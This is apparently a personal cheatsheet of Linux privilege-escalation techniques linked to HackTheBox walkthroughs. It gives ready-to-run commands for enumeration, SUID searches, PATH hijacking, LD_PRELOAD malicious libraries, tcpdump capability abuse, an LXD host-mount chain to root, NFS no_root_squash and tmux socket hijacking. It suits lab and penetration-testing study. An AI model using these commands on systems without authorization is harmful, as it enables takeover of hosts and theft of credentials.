# Linux Privilege Escalation

## First Pass Enumeration

| Command | Description |
|---|---|
| `ps aux \| grep root` | Processes running as root |
| `ps au` | Logged-in users |
| `ls /home` | Enumerate home directories |
| `ls -l ~/.ssh` | Check for SSH keys |
| `history` | Bash history — often leaks creds or hints |
| `sudo -l` | **Always check first** — what can this user run as another user? |
| `ls -la /etc/cron.daily` | Scheduled tasks worth reviewing |
| `lsblk` | Unmounted filesystems/drives |

## Writable File/Directory Search

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null   # world-writable dirs
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null   # world-writable files
```

## Kernel & OS Version

```bash
uname -a
cat /etc/lsb-release
gcc kernel_exploit.c -o kernel_exploit   # compile once a candidate CVE is identified
```

## SUID / SGID Binaries

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null    # SUID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null    # SGID
```

Cross-reference discovered binaries against [GTFOBins](https://gtfobins.github.io/) for known escalation primitives.

## Process Monitoring

```bash
./pspy64 -pf -i 1000
```
Watches processes (including those run by other users/cron) without needing root — invaluable for spotting scheduled jobs that run as root with an exploitable pattern.

## PATH Hijacking

```bash
echo $PATH
PATH=.:${PATH}   # prepend current directory — dangerous if a root-run script calls a binary by relative name
```

## LD_PRELOAD / Shared Library Abuse

```bash
ldd /bin/ls                                          # check shared object dependencies
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
readelf -d payroll | grep PATH                       # check binary RUNPATH
gcc src.c -fPIC -shared -o /development/libshared.so  # compile a malicious shared lib
```

## Capability Abuse (tcpdump example)

```bash
sudo /usr/sbin/tcpdump -ln -i <IFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

## LXD Group → Root

```bash
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
```

Membership in the `lxd`/`docker` group is root-equivalent for the same reason — privileged container init lets you mount the host filesystem in. See [`kobold.md`](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/kobold.md) for the `docker`-group version of this technique.

## NFS No-Root-Squash

```bash
showmount -e <TARGET>
sudo mount -t nfs <TARGET>:/tmp /mnt
```
If the exported share doesn't squash root, a SUID binary planted from the attacker side keeps its root ownership on the target.

## Shared tmux Sessions

```bash
tmux -S /shareds new -s debugsess
```
If a root-owned tmux socket is world-accessible, attaching to it inherits that session's privilege level.

## Automated Auditing

```bash
./lynis audit system
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Applied examples: [Kobold](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/kobold.md) (docker group), [Nibbles](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/nibbles.md) (sudo on writable script), [Browsed](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/browsed.md) (`.pyc` cache poisoning)*

</div>
